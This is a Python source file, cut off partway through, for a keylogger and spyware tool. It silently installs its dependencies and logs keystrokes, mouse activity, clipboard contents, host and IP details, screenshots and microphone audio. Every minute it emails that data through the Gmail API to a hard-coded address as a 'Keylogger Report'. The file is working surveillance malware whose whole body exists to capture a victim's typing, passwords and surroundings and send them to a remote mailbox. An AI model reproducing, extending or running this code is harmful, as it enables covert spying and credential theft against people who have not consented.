try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    import pyperclip
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
    import time
    import tempfile
    from google.oauth2.credentials import Credentials
    from google_auth_oauthlib.flow import InstalledAppFlow
    from googleapiclient.discovery import build
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput", "pyperclip", "google-auth", "google-auth-oauthlib", "google-auth-httplib2", "google-api-python-client"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    # Update the path to your OAuth 2.0 credentials JSON file
    CREDENTIALS_FILE = 'path/to/your/credentials.json'
    SCOPES = ['https://www.googleapis.com/auth/gmail.send']

    def get_gmail_service():
        creds = None
        if os.path.exists('token.json'):
            creds = Credentials.from_authorized_user_file('token.json', SCOPES)
        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
                creds = flow.run_local_server(port=0)
            with open('token.json', 'w') as token:
                token.write(creds.to_json())
        service = build('gmail', 'v1', credentials=creds)
        return service

    SEND_REPORT_EVERY = 60  # as in seconds

    class KeyLogger:
        def __init__(self, time_interval):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.service = get_gmail_service()

        def appendlog(self, string):
            self.log += string

        def on_move(self, x, y):
            current_move = "Mouse moved to {} {}\n".format(x, y)
            self.appendlog(current_move)

        def on_click(self, x, y, button, pressed):
            current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
            self.appendlog(current_click)

        def on_scroll(self, x, y, dx, dy):
            current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key + "\n")

        def send_mail(self, message, attachment_path=None):
            try:
                message = MIMEMultipart()
                message['to'] = 'mobi.mail.tp@gmail.com'
                message['from'] = 'mobi.mail.tp@gmail.com'
                message['subject'] = 'Keylogger Report'

                message.attach(MIMEText(self.log, 'plain'))

                if attachment_path and os.path.exists(attachment_path):
                    with open(attachment_path, "rb") as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                        message.attach(part)

                raw_message = base64.urlsafe_b64encode(message.as_bytes()).decode()
                message_body = {'raw': raw_message}
                self.service.users().messages().send(userId='me', body=message_body).execute()
            except Exception as e:
                logging.error(f"Failed to send email: {e}")
                os._exit(1)

        def report(self):
            self.appendlog("\nClipboard content: " + self.get_clipboard_content() + "\n")
            screenshot_path = self.screenshot()
            self.send_mail("\n\n" + self.log, screenshot_path)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

        def get_clipboard_content(self, max_retries=5):
            for i in range(max_retries):
                try:
                    return pyperclip.paste()
                except pyperclip.PyperclipException as e:
                    self.appendlog(f"Error accessing clipboard (attempt {i+1}): {e}\n")
                    time.sleep(1)
            return "Could not access clipboard"

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog("Hostname: {}\n".format(hostname))
            self.appendlog("IP Address: {}\n".format(ip))
            self.appendlog("Processor: {}\n".format(plat))
            self.appendlog("System: {}\n".format(system))
            self.appendlog("Machine: {}\n".format(machine))

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs,
